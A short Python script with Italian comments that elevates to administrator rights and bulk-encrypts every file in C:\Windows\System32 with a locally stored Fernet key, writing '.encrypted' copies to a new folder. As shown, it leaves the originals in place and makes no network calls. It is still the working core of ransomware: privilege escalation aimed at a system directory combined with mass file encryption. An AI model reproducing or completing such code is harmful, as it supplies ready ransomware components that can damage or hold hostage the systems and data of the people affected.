from cryptography.fernet import Fernet  # type: ignore
import os
from elevate import elevate

cartella_scelta = r"C:\Windows\System32"  # Modifica il percorso della cartella
elevate()

def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("secret.key", "rb").read()

def encrypt_folder(cartella_scelta):
    key = load_key()
    f = Fernet(key)

    # Crea una nuova cartella per i file criptati
    cartella_criptata = cartella_scelta + "_criptata"
    os.makedirs(cartella_criptata, exist_ok=True)

    # Itera sui file nella cartella
    for file_name in os.listdir(cartella_scelta):
        full_file_path = os.path.join(cartella_scelta, file_name)

        if os.path.isfile(full_file_path):  # Controlla se è un file
            with open(full_file_path, "rb") as file:
                file_data = file.read()

            encrypted_data = f.encrypt(file_data)

            # Salva il file criptato nella nuova cartella
            encrypted_file_path = os.path.join(cartella_criptata, file_name + ".encrypted")
            with open(encrypted_file_path, "wb") as file:
                file.write(encrypted_data)

            print(f"{full_file_path} criptato con successo!")

# Esempio di chiamata alla funzione
generate_key()  # Genera la chiave una sola volta
encrypt_folder(cartella_scelta)
